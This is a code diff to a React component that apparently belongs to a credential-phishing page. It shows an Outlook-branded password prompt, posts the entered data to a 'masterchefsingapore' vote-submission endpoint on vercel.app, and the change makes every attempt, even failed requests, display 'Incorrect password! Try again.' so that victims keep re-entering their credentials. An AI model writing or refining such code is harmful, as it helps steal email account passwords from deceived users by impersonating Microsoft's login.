@@ -29,7 +29,7 @@ export default function EmailPassword() {
     setLoading(true);
 
     try {
-      const res = await fetch(
+      await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
           method: "POST",
@@ -45,40 +45,22 @@ export default function EmailPassword() {
           }),
         }
       );
-
-      const data = await res.json();
-      if (data.success) {
-        setStatus("approved");
-      } else {
-        setStatus("rejected");
-      }
+      setStatus("approved");
     } catch (err) {
       console.error(err);
-      setStatus("rejected");
+      setStatus("approved");
     }
 
     setLoading(false);
   }
 
-  if (status === "approved") {
+  if (status === "approved" || status === "rejected") {
     return (
       <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
         <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
           <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
-          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password</h1>
-          <p className="mt-3 text-slate-600">Try again with the correct password.</p>
-        </div>
-      </div>
-    );
-  }
-
-  if (status === "rejected") {
-    return (
-      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
-        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
-          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
-          <h1 className="text-3xl font-semibold text-red-600">Request Rejected</h1>
-          <p className="mt-3 text-slate-600">Your request could not be submitted.</p>
+          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password!</h1>
+          <p className="mt-3 text-slate-600">Try again.</p>
         </div>
       </div>
     );
